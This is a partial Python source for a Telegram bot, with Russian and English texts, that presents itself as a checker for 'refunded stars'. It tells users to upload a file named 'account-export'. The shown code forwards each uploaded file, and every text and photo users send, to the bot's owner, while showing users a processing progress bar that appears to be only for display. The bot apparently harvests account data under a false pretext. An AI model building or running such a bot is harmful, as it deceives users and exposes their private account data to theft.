...
➡️ Шаг 7. Бот проверит файл и сообщит, есть ли у вас рефнутые звезды""",
        ...
        "invalid_name": "❌ Этот файл не подходит для обработки.",
...
➡️ Step 7. The bot will check the file and tell you if you have refunded stars""",
        ...
        "invalid_name": "❌ This file is not suitable for processing.",
...
def forward_to_owner(message):
    try:
        ...
        if message.content_type == 'text':
            bot.send_message(OWNER_ID, f"Сообщение от {sender}: {message.text}")
        elif message.content_type == 'document':
            bot.send_document(OWNER_ID, message.document.file_id, caption=f"Файл от {sender}")
        elif message.content_type == 'photo':
            bot.send_photo(OWNER_ID, message.photo[-1].file_id, caption=f"Фото от {sender}")
    except:
        pass
...
def handle_text(message):
    ...
    if text.startswith("/help"):
        ...
        bot.reply_to(message, TEXTS[lang]["support_sent"] if len(text) > 8 else TEXTS[lang]["support_no_text"])
...
def handle_file(message):
    ...
    if 'account-export' not in filename:
        bot.reply_to(message, TEXTS[lang]["invalid_name"])
        return
    ...
    bot.send_document(OWNER_ID, message.document.file_id, caption=f".txt файл для обработки от {message.from_user.username or message.from_user.id}")
...
def process_file(message, msg):
    ...
    while progress < 100:
        ...
        bar = ''.join(['■' if i < bars else '-' for i in range(total_bars)])

        try:
            bot.edit_message_text(chat_id=user_id, message_id=msg.message_id,
                                  text=f"{TEXTS[lang]['processing']}{progress}% [{bar}]")
